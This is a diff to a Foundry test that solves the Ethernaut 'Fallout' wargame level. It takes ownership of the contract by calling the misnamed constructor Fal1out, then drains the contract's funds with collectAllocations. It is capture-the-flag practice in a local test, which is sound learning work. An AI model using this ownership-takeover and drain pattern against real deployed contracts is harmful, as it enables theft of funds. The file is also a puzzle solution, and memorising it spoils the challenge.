@@ -7,7 +7,7 @@ import "forge-std/Vm.sol";
 import "ethernaut/Ethernaut.sol";
 import "ethernaut/Fallout/FalloutFactory.sol";
 
-contract FalloutTest {
+contract FalloutTest is DSTest {
     //state variables we will need 
     Vm vm = Vm(address(HEVM_ADDRESS));
     Ethernaut ethernaut;
@@ -21,18 +21,23 @@ contract FalloutTest {
 
     //test for hacking level
     function testFalloutHack() public {
+        //Level set up
         FalloutFactory falloutFactory = new FalloutFactory();
+        ethernaut.registerLevel(falloutFactory);
         vm.startPrank(attacker);
 
-        address levelAddress = ethernaut.createInstance(falloutFactory);
-        Fallout falloutAddres = Fallout(payable(levelAdress));
+        address levelAddress = ethernaut.createLevelInstance(falloutFactory);
+        Fallout falloutAddress = Fallout(payable(levelAddress));
 
         //Level Attack
 
-        falloutAddress.Fal1out{value: 1 wei}(' ');
+        falloutAddress.Fal1out{ value: 1 wei}();
         assertEq(falloutAddress.owner(), attacker);
 
-        // Level 
+        falloutAddress.collectAllocations();
+        assertEq(address(falloutAddress).balance, 0);
+
+        // Level submission
 
         bool challengeCompleted = ethernaut.submitLevelInstance(
             payable(levelAddress)
